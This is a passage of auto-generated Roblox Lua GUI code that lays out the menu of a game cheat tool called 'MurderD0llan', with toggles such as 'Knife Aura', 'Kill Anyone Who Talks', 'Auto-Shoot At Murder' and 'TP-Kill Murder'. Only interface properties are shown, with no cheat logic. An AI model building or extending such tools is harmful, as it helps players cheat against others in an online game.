G2L["ff"]["TextWrapped"] = true;
G2L["ff"]["TextStrokeTransparency"] = 0;
G2L["ff"]["BorderSizePixel"] = 0;
G2L["ff"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ff"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["ff"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ff"]["TextSize"] = 18;
G2L["ff"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["ff"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["ff"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["ff"]["Name"] = [[activateKnifeWhenNearPlayer]];
G2L["ff"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ff"]["Text"] = [[activate knife when near player  ]];
G2L["ff"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.activateKnifeWhenNearPlayer.Frame
G2L["100"] = Instance.new("Frame", G2L["ff"]);
G2L["100"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["100"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["100"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["100"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.activateKnifeWhenNearPlayer.UIGradient
G2L["101"] = Instance.new("UIGradient", G2L["ff"]);
G2L["101"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.knifeaura
G2L["102"] = Instance.new("TextButton", G2L["e0"]);
G2L["102"]["TextWrapped"] = true;
G2L["102"]["TextStrokeTransparency"] = 0;
G2L["102"]["BorderSizePixel"] = 0;
G2L["102"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["102"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["102"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["102"]["TextSize"] = 18;
G2L["102"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["102"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["102"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["102"]["Name"] = [[knifeaura]];
G2L["102"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["102"]["Text"] = [[Knife Aura  ]];
G2L["102"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.knifeaura.Frame
G2L["103"] = Instance.new("Frame", G2L["102"]);
G2L["103"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["103"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["103"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["103"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.knifeaura.UIGradient
G2L["104"] = Instance.new("UIGradient", G2L["102"]);
G2L["104"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.TextBoxButton1KnifeAura
G2L["105"] = Instance.new("TextButton", G2L["e0"]);
G2L["105"]["TextWrapped"] = true;
G2L["105"]["TextStrokeTransparency"] = 0;
G2L["105"]["BorderSizePixel"] = 0;
G2L["105"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["105"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["105"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["105"]["TextSize"] = 20;
G2L["105"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["105"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["105"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["105"]["Name"] = [[TextBoxButton1KnifeAura]];
G2L["105"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["105"]["Text"] = [[  Enter Knife Aura Value...]];
G2L["105"]["Position"] = UDim2.new(0.5456903576850891, 0, 0.8142253160476685, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.TextBoxButton1KnifeAura.UIGradient
G2L["106"] = Instance.new("UIGradient", G2L["105"]);
G2L["106"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.TextBoxButton1KnifeAura.TextBox
G2L["107"] = Instance.new("TextBox", G2L["105"]);
G2L["107"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["107"]["TextSize"] = 14;
G2L["107"]["TextWrapped"] = true;
G2L["107"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["107"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["107"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["107"]["PlaceholderText"] = [[enter...]];
G2L["107"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["107"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["107"]["Text"] = [[]];
G2L["107"]["Position"] = UDim2.new(0.7409999966621399, 0, 0.17599999904632568, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.throwaura
G2L["108"] = Instance.new("TextButton", G2L["e0"]);
G2L["108"]["TextWrapped"] = true;
G2L["108"]["TextStrokeTransparency"] = 0;
G2L["108"]["BorderSizePixel"] = 0;
G2L["108"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["108"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["108"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["108"]["TextSize"] = 18;
G2L["108"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["108"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["108"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["108"]["Name"] = [[throwaura]];
G2L["108"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["108"]["Text"] = [[Throw Aura  ]];
G2L["108"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.throwaura.Frame
G2L["109"] = Instance.new("Frame", G2L["108"]);
G2L["109"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["109"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["109"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["109"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.throwaura.UIGradient
G2L["10a"] = Instance.new("UIGradient", G2L["108"]);
G2L["10a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.TextBoxButton1ThrowAura
G2L["10b"] = Instance.new("TextButton", G2L["e0"]);
G2L["10b"]["TextWrapped"] = true;
G2L["10b"]["TextStrokeTransparency"] = 0;
G2L["10b"]["BorderSizePixel"] = 0;
G2L["10b"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["10b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10b"]["TextSize"] = 20;
G2L["10b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["10b"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["10b"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["10b"]["Name"] = [[TextBoxButton1ThrowAura]];
G2L["10b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10b"]["Text"] = [[  Enter Throw Aura Value...]];
G2L["10b"]["Position"] = UDim2.new(0.5456903576850891, 0, 0.8142253160476685, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.TextBoxButton1ThrowAura.UIGradient
G2L["10c"] = Instance.new("UIGradient", G2L["10b"]);
G2L["10c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.TextBoxButton1ThrowAura.TextBox
G2L["10d"] = Instance.new("TextBox", G2L["10b"]);
G2L["10d"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["10d"]["TextSize"] = 14;
G2L["10d"]["TextWrapped"] = true;
G2L["10d"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["10d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10d"]["PlaceholderText"] = [[enter...]];
G2L["10d"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["10d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10d"]["Text"] = [[]];
G2L["10d"]["Position"] = UDim2.new(0.7409999966621399, 0, 0.17599999904632568, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.killanyonewhotalks
G2L["10e"] = Instance.new("TextButton", G2L["e0"]);
G2L["10e"]["TextWrapped"] = true;
G2L["10e"]["TextStrokeTransparency"] = 0;
G2L["10e"]["BorderSizePixel"] = 0;
G2L["10e"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10e"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["10e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10e"]["TextSize"] = 20;
G2L["10e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["10e"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["10e"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["10e"]["Name"] = [[killanyonewhotalks]];
G2L["10e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10e"]["Text"] = [[Kill Anyone Who Talks  ]];
G2L["10e"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.killanyonewhotalks.Frame
G2L["10f"] = Instance.new("Frame", G2L["10e"]);
G2L["10f"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["10f"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["10f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10f"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.killanyonewhotalks.UIGradient
G2L["110"] = Instance.new("UIGradient", G2L["10e"]);
G2L["110"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.KillGun
G2L["111"] = Instance.new("TextButton", G2L["e0"]);
G2L["111"]["TextWrapped"] = true;
G2L["111"]["TextStrokeTransparency"] = 0;
G2L["111"]["BorderSizePixel"] = 0;
G2L["111"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["111"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["111"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["111"]["TextSize"] = 20;
G2L["111"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["111"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["111"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["111"]["Name"] = [[KillGun]];
G2L["111"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["111"]["Text"] = [[Kill-Gun [CLIENT-SIDED]  ]];
G2L["111"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.KillGun.Frame
G2L["112"] = Instance.new("Frame", G2L["111"]);
G2L["112"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["112"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["112"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["112"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.KillGun.UIGradient
G2L["113"] = Instance.new("UIGradient", G2L["111"]);
G2L["113"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.STOPTHETIME
G2L["114"] = Instance.new("TextButton", G2L["e0"]);
G2L["114"]["TextWrapped"] = true;
G2L["114"]["TextStrokeTransparency"] = 0;
G2L["114"]["BorderSizePixel"] = 0;
G2L["114"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["114"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["114"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["114"]["TextSize"] = 20;
G2L["114"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["114"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["114"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["114"]["Name"] = [[STOPTHETIME]];
G2L["114"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["114"]["Text"] = [[stop the time [TOOL]  ]];
G2L["114"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.STOPTHETIME.Frame
G2L["115"] = Instance.new("Frame", G2L["114"]);
G2L["115"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["115"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["115"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["115"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_3.STOPTHETIME.UIGradient
G2L["116"] = Instance.new("UIGradient", G2L["114"]);
G2L["116"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4
G2L["117"] = Instance.new("ScrollingFrame", G2L["a"]);
G2L["117"]["Active"] = true;
G2L["117"]["BorderSizePixel"] = 0;
G2L["117"]["CanvasSize"] = UDim2.new(0, 0, 0, 847);
G2L["117"]["TopImage"] = [[]];
G2L["117"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["117"]["BackgroundTransparency"] = 0.9599999785423279;
G2L["117"]["Size"] = UDim2.new(0, 367, 0, 228);
G2L["117"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["117"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["117"]["Position"] = UDim2.new(0, 0, -6.667785612535226e-08, 0);
G2L["117"]["Visible"] = false;
G2L["117"]["Name"] = [[page_4]];
G2L["117"]["BottomImage"] = [[]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.UIListLayout
G2L["118"] = Instance.new("UIListLayout", G2L["117"]);
G2L["118"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["118"]["Padding"] = UDim.new(0, 5);
G2L["118"]["SortOrder"] = Enum.SortOrder.LayoutOrder;

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.TemplateButton
G2L["119"] = Instance.new("TextButton", G2L["117"]);
G2L["119"]["TextWrapped"] = true;
G2L["119"]["TextStrokeTransparency"] = 0;
G2L["119"]["BorderSizePixel"] = 0;
G2L["119"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["119"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["119"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["119"]["TextSize"] = 20;
G2L["119"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["119"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["119"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["119"]["Name"] = [[TemplateButton]];
G2L["119"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["119"]["Text"] = [[shoot at random player  ]];
G2L["119"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.TemplateButton.UIGradient
G2L["11a"] = Instance.new("UIGradient", G2L["119"]);
G2L["11a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.TemplateButton
G2L["11b"] = Instance.new("TextButton", G2L["117"]);
G2L["11b"]["TextWrapped"] = true;
G2L["11b"]["TextStrokeTransparency"] = 0;
G2L["11b"]["BorderSizePixel"] = 0;
G2L["11b"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11b"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["11b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11b"]["TextSize"] = 20;
G2L["11b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["11b"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["11b"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["11b"]["Name"] = [[TemplateButton]];
G2L["11b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11b"]["Text"] = [[shoot at murder  ]];
G2L["11b"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.TemplateButton.UIGradient
G2L["11c"] = Instance.new("UIGradient", G2L["11b"]);
G2L["11c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.Separator
G2L["11d"] = Instance.new("TextLabel", G2L["117"]);
G2L["11d"]["TextWrapped"] = true;
G2L["11d"]["BorderSizePixel"] = 0;
G2L["11d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["11d"]["TextSize"] = 16;
G2L["11d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11d"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["11d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11d"]["Text"] = [[- - - - - - - - - -  - - - - - - - - - -  - - - - - - - - - -  ]];
G2L["11d"]["Name"] = [[Separator]];
G2L["11d"]["BackgroundTransparency"] = 1;
G2L["11d"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.autoshootatmurder
G2L["11e"] = Instance.new("TextButton", G2L["117"]);
G2L["11e"]["TextWrapped"] = true;
G2L["11e"]["TextStrokeTransparency"] = 0;
G2L["11e"]["BorderSizePixel"] = 0;
G2L["11e"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11e"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["11e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["11e"]["TextSize"] = 20;
G2L["11e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["11e"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["11e"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["11e"]["Name"] = [[autoshootatmurder]];
G2L["11e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11e"]["Text"] = [[Auto-Shoot At Murder  ]];
G2L["11e"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.autoshootatmurder.Frame
G2L["11f"] = Instance.new("Frame", G2L["11e"]);
G2L["11f"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["11f"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["11f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["11f"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.autoshootatmurder.UIGradient
G2L["120"] = Instance.new("UIGradient", G2L["11e"]);
G2L["120"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.TemplateButton
G2L["121"] = Instance.new("TextButton", G2L["117"]);
G2L["121"]["TextWrapped"] = true;
G2L["121"]["TextStrokeTransparency"] = 0;
G2L["121"]["BorderSizePixel"] = 0;
G2L["121"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["121"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["121"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["121"]["TextSize"] = 20;
G2L["121"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["121"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["121"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["121"]["Name"] = [[TemplateButton]];
G2L["121"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["121"]["Text"] = [[shoot murder - not selected key  ]];
G2L["121"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);
-- Attributes
G2L["121"]:SetAttribute([[SELECTED_KEY]], [[Unknown]]);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.TemplateButton.UIGradient
G2L["122"] = Instance.new("UIGradient", G2L["121"]);
G2L["122"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.shootmurderwhenpressingkey
G2L["123"] = Instance.new("TextButton", G2L["117"]);
G2L["123"]["TextWrapped"] = true;
G2L["123"]["TextStrokeTransparency"] = 0;
G2L["123"]["BorderSizePixel"] = 0;
G2L["123"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["123"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["123"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["123"]["TextSize"] = 18;
G2L["123"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["123"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["123"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["123"]["Name"] = [[shootmurderwhenpressingkey]];
G2L["123"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["123"]["Text"] = [[Shoot Murder when Pressing key  ]];
G2L["123"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.shootmurderwhenpressingkey.Frame
G2L["124"] = Instance.new("Frame", G2L["123"]);
G2L["124"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["124"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["124"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["124"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.shootmurderwhenpressingkey.UIGradient
G2L["125"] = Instance.new("UIGradient", G2L["123"]);
G2L["125"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.TemplateButton
G2L["126"] = Instance.new("TextButton", G2L["117"]);
G2L["126"]["TextWrapped"] = true;
G2L["126"]["TextStrokeTransparency"] = 0;
G2L["126"]["BorderSizePixel"] = 0;
G2L["126"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["126"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["126"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["126"]["TextSize"] = 20;
G2L["126"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["126"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["126"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["126"]["Name"] = [[TemplateButton]];
G2L["126"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["126"]["Text"] = [[TP-Kill Murder  ]];
G2L["126"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.5860804319381714, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.TemplateButton.UIGradient
G2L["127"] = Instance.new("UIGradient", G2L["126"]);
G2L["127"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.FastSeparator
G2L["128"] = Instance.new("TextLabel", G2L["117"]);
G2L["128"]["TextWrapped"] = true;
G2L["128"]["BorderSizePixel"] = 0;
G2L["128"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["128"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["128"]["TextSize"] = 16;
G2L["128"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["128"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["128"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["128"]["Text"] = [[- - -  ]];
G2L["128"]["Name"] = [[FastSeparator]];
G2L["128"]["BackgroundTransparency"] = 1;
G2L["128"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.spamgun
G2L["129"] = Instance.new("TextButton", G2L["117"]);
G2L["129"]["TextWrapped"] = true;
G2L["129"]["TextStrokeTransparency"] = 0;
G2L["129"]["BorderSizePixel"] = 0;
G2L["129"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["129"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["129"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["129"]["TextSize"] = 20;
G2L["129"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["129"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["129"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["129"]["Name"] = [[spamgun]];
G2L["129"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["129"]["Text"] = [[spam gun  ]];
G2L["129"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.spamgun.Frame
G2L["12a"] = Instance.new("Frame", G2L["129"]);
